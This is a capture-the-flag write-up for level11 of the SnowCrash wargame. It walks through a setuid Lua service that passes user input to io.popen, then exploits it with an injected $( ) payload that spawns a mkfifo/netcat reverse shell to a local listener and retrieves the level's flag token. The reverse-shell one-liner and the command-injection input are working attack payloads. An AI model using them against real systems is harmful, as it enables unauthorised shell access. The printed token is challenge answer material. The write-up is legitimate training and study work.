# level11

## Recognition

There is a lua script at the root of the home of level11, which is owned by flag11.

```bash
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

When looking at the content of the script, we can see that it passes the input of the user to a "hash()" function which will use `io.popen()` to execute a command in sh.
```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

</br>
</br>

## Exploition

Knowing that our input will be executed by the script, we can exploit that to get the token.

However, `io.popen()` will save all standart outputs to a string which it will return, so to get our output we can either choose to redirect the output to a file, or use it to execute a reverse shell.

We will run a netcat server in parrallel on the host machine
```bash
level11@SnowCrash:~$ nc -lk 127.0.0.1 9000
```

And then connect to the level11 program and give the reverse shell as password to run a program instance with flag11 suid connected to the netcat server.
```bash
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: $( rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 9000 >/tmp/f )
```

Then, the shell should appear on the netcat server listening for the connection, we can now run `getflag` since we are logged as flag11.
```bash
level11@SnowCrash:~$ nc -lk 127.0.0.1 9000
$
$ id
uid=3011(flag11) gid=3011(flag11) groups=3011(flag11),1001(flag)
$ getflag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```